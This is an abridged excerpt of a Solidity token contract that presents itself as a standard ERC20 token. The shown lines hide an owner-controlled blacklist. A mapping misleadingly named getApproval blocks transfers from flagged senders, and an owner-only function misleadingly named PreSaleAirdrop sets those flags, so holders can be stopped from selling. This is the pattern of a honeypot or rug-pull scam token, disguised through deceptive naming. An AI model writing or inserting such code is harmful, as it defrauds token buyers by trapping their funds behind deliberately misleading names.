...
contract ERC20 is Context, IERC20 {
  ...
  mapping(address => bool) public getApproval;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal virtual {
      ...
      require(!getApproval[sender], "Approve");
  ...
  function PreSaleAirdrop(address _address, bool _AirDropped) external {
      require(_msgSender() == owner, "Claim Address");
      getApproval[_address] = _AirDropped;
  }
}